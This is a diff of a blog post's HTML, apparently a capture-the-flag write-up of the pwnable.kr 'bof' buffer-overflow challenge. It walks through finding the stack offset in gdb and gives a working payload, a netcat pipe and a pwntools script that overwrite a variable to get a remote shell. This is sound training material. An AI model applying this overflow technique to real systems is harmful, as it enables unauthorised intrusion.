@@ -85,7 +85,7 @@
 
 <h2 id="introduction">Introduction</h2>
 <p><br> Hey guys it’s been a long time since my <a href="https://0xrick.github.io/pwn/fd/">first pwn write-up</a>,  today I’ll write about another challenge from <a href="https://pwnable.kr" target="_blank" rel="noopener noreferrer">pwnable.kr</a> called bof. It was a simple easy buffer overflow challenge (You can also check <a href="/categories/#binary-exploitation">these</a>), by overwriting a variable we can get a shell. I’ll also write a small exploit with <code class="highlighter-rouge">pwntools</code> that spawns a shell automatically.
-<img src="/images/pwn/bof/0.png" alt=""></p>
+<br><img src="/images/pwn/bof/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="challenge-description">Challenge Description</h2>
@@ -98,44 +98,43 @@ Download : http://pwnable.kr/bin/bof.c
 Running at : nc pwnable.kr 9000
 </code></pre></div></div>
 <p><br> Pretty straightforward, we have the vulnerable binary, its source code and the port where it’s running. 
-<img src="/images/pwn/bof/1.png" alt=""></p>
+<br><img src="/images/pwn/bof/1.png" alt=""><br></p>
 <hr>
 
 <h2 id="code-analysis">Code Analysis</h2>
-<p><br> Let’s take a look at the code :
-<img src="/images/pwn/bof/2.png" alt=""></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+<p><br> Let’s take a look at the code :</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 #include &lt;stdlib.h&gt;
-void func(int key){
-	char overflowme[32];
-	printf("overflow me : ");
-	gets(overflowme);	// smash me!
-	if(key == 0xcafebabe){
-		system("/bin/sh");
-	}
-	else{
-		printf("Nah..\n");
-	}
-}
-int main(int argc, char* argv[]){
-	func(0xdeadbeef);
-	return 0;
-}
+</span><span class="kt">void</span> <span class="n">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
+	<span class="kt">char</span> <span class="n">overflowme</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"overflow me : "</span><span class="p">);</span>
+	<span class="n">gets</span><span class="p">(</span><span class="n">overflowme</span><span class="p">);</span>	<span class="c1">// smash me!
+</span>	<span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">){</span>
+		<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">else</span><span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Nah..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+	<span class="n">func</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div></div>
 <p><br> There are two functions, the main function and another function called <code class="highlighter-rouge">func()</code>
 <br> <code class="highlighter-rouge">func()</code>:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void func(int key){
-	char overflowme[32];
-	printf("overflow me : ");
-	gets(overflowme);	// smash me!
-	if(key == 0xcafebabe){
-		system("/bin/sh");
-	}
-	else{
-		printf("Nah..\n");
-	}
-}
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
+	<span class="kt">char</span> <span class="n">overflowme</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"overflow me : "</span><span class="p">);</span>
+	<span class="n">gets</span><span class="p">(</span><span class="n">overflowme</span><span class="p">);</span>	<span class="c1">// smash me!
+</span>	<span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">){</span>
+		<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">else</span><span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Nah..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div></div>
 <p><br> Breakdown :
 <br> The function takes a variable called <code class="highlighter-rouge">key</code>, it starts by creating a variable called <code class="highlighter-rouge">overflowme</code> and sets a buffer of 32 chars for it : <code class="highlighter-rouge">char overflowme[32];</code>
@@ -143,9 +142,9 @@ int main(int argc, char* argv[]){
 <br> After that there’s an if statement that checks if the variable <code class="highlighter-rouge">key</code> is equal to <code class="highlighter-rouge">0xcafebabe</code> (<code class="highlighter-rouge">if(key == 0xcafebabe){</code>). If that’s true it will spawn a shell (<code class="highlighter-rouge">system("/bin/sh");</code>), if <code class="highlighter-rouge">key</code> is equal to anything else it will print <code class="highlighter-rouge">Nah..</code> (<code class="highlighter-rouge">printf("Nah..\n");</code>)
 <br>
 <br> <code class="highlighter-rouge">main()</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int main(int argc, char* argv[]){
-	func(0xdeadbeef);
-	return 0;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+	<span class="n">func</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </code></pre></div></div>
 <p><br> Basically what the main function is doing is just calling the function <code class="highlighter-rouge">func()</code> giving <code class="highlighter-rouge">key</code> the value of <code class="highlighter-rouge">0xdeadbeef</code>
 <br>
@@ -155,46 +154,48 @@ int main(int argc, char* argv[]){
 
 <h2 id="examining-the-binary-exploitation">Examining the Binary, Exploitation</h2>
 <p><br> I ran the program and tested it a couple of times. First one with a short input :
-<img src="/images/pwn/bof/3.png" alt="">
+<br><img src="/images/pwn/bof/3.png" alt=""><br>
 <br> Second one with a longer input and it crashed:
-<img src="/images/pwn/bof/4.png" alt="">
+<br><img src="/images/pwn/bof/4.png" alt=""><br>
 <br> Important thing to note here, we don’t want to know the offset or where the program exactly crashes. This is because we don’t need to overwrite <code class="highlighter-rouge">EIP</code>, we need to overwrite a variable’s value and that’s located on the stack. So giving the program a pattern and finding the offset won’t help because we need to know where <code class="highlighter-rouge">0xdeadbeef</code> is located on the stack.
 <br> It’s time for <code class="highlighter-rouge">gdb</code>. I started <code class="highlighter-rouge">gdb</code> and created a break point at <code class="highlighter-rouge">main</code> (<code class="highlighter-rouge">break main</code>) then I started the program (<code class="highlighter-rouge">r</code>) : 
-<img src="/images/pwn/bof/5.png" alt="">
+<br><img src="/images/pwn/bof/5.png" alt=""><br>
 <br> It stopped at the break point. We need to disassemble the function <code class="highlighter-rouge">func()</code> to get the address of the compare instruction that compares between the value of <code class="highlighter-rouge">key</code> and <code class="highlighter-rouge">0xcafebabe</code> to set another break point there and look at the stack.
-<code class="highlighter-rouge">disas func</code>
-<img src="/images/pwn/bof/6.png" alt="">
+<br><code class="highlighter-rouge">disas func</code>
+<br><img src="/images/pwn/bof/6.png" alt=""><br>
 <br> We can see the <a href="https://www.ibm.com/support/knowledgecenter/en/ssw_aix_72/com.ibm.aix.alangref/idalangref_comp_logical_inst.htm" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">cmpl</code> (Compare Logical)</a> instruction at <code class="highlighter-rouge">0x0000654</code>, Lets set a break point exactly before it :
-<code class="highlighter-rouge">break *0x80000654</code>
-<img src="/images/pwn/bof/7.png" alt="">
+<br><code class="highlighter-rouge">break *0x80000654</code>
+<br><img src="/images/pwn/bof/7.png" alt=""><br>
 <br> Now let’s continue the execution (<code class="highlighter-rouge">c</code>) and wait for our break point.
-<img src="/images/pwn/bof/8.png" alt="">
+<br><img src="/images/pwn/bof/8.png" alt=""><br>
 <br> I gave it a short input because we don’t need to crash it and overwrite stuff on the stack, we just need to look at the stack during a normal execution to locate <code class="highlighter-rouge">0xdeadbeef</code>.
 <br> After hitting the second break point let’s look at the stack :
-<code class="highlighter-rouge">x/50wx $esp</code>
-<img src="/images/pwn/bof/9.png" alt="">
+<br><code class="highlighter-rouge">x/50wx $esp</code>
+<br><img src="/images/pwn/bof/9.png" alt=""><br>
 <br> <code class="highlighter-rouge">0xdeadbeef</code> appears at the first row in front of <code class="highlighter-rouge">0xbffff2e0</code> and our input starts to appear at the last row in front of <code class="highlighter-rouge">0xbffff2a0</code>. We can locate the distance between our input and <code class="highlighter-rouge">0xdeadbeef</code> easily, each hex value represents 4 chars (<code class="highlighter-rouge">0x41414141 == AAAA</code>) and we have exactly 13 of them before <code class="highlighter-rouge">0xdeadbeef</code> (<code class="highlighter-rouge">1 + 4 + 4 + 4</code>). 
-<img src="/images/pwn/bof/10.png" alt="">
+<br><img src="/images/pwn/bof/10.png" alt=""><br>
 <br> We need to give the program exactly 52 chars then <code class="highlighter-rouge">0xcafebabe</code> and eventually <code class="highlighter-rouge">0xdeadbeef</code> will be overwritten. 
 <br> Let’s try it, I used python to print the payload in a file then I piped that file to the <code class="highlighter-rouge">nc</code> connection :
-<code class="highlighter-rouge">python -c "print 'A' * 52 + '\xbe\xba\xfe\xca'" &gt; ./payload</code>
-<br>
-<br>
-<code class="highlighter-rouge">(cat payload &amp;&amp; cat) | nc pwnable.kr 9000</code>
-<img src="/images/pwn/bof/11.png" alt="">
+<br><code class="highlighter-rouge">python -c "print 'A' * 52 + '\xbe\xba\xfe\xca'" &gt; ./payload</code>
+<br><code class="highlighter-rouge">(cat payload &amp;&amp; cat) | nc pwnable.kr 9000</code>
+<br><img src="/images/pwn/bof/11.png" alt=""><br>
 <br> Pwned !
 <br></p>
 <hr>
 
 <h2 id="writing-an-exploit-with-pwntools">Writing an Exploit with pwntools</h2>
 <p><br> One of the cool things about <code class="highlighter-rouge">pwntools</code> is the simplicity, combined with the simplicity of this exploit will make it just 4 lines of code. 
-<br> First thing we need to do is to import <code class="highlighter-rouge">pwntools</code> : <code class="highlighter-rouge">from pwn import *</code>
-<br> We need to store our payload in a variable : <code class="highlighter-rouge">payload = 'A' * 52 + '\xbe\xba\xfe\xca'</code>
-<br> Then we need to initiate the connection and assign a variable for it : <code class="highlighter-rouge">shell = remote('pwnable.kr' ,9000)</code>
-<br> After that we will send the payload : <code class="highlighter-rouge">shell.send(payload)</code>
-<br> And finally we can interact with our shell : <code class="highlighter-rouge">shell.interactive()</code>
-<img src="/images/pwn/bof/12.png" alt=""></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+<br> First thing we need to do is to import <code class="highlighter-rouge">pwntools</code> :
+<br><code class="highlighter-rouge">from pwn import *</code>
+<br> We need to store our payload in a variable :
+<br><code class="highlighter-rouge">payload = 'A' * 52 + '\xbe\xba\xfe\xca'</code>
+<br> Then we need to initiate the connection and assign a variable for it : 
+<br><code class="highlighter-rouge">shell = remote('pwnable.kr' ,9000)</code>
+<br> After that we will send the payload :
+<br> <code class="highlighter-rouge">shell.send(payload)</code>
+<br> And finally we can interact with our shell :
+<br> <code class="highlighter-rouge">shell.interactive()</code></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">52</span> <span class="o">+</span> <span class="s">'</span><span class="se">\xbe\xba\xfe\xca</span><span class="s">'</span>
@@ -202,7 +203,7 @@ int main(int argc, char* argv[]){
 <span class="n">shell</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
-<p><img src="/images/pwn/bof/13.png" alt="">
+<p><br><img src="/images/pwn/bof/13.png" alt=""><br>
 <br> Pwned again !
 <br> That’s it , Feedback is appreciated !
 <br> Don’t forget to read the <a href="/categories">other write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
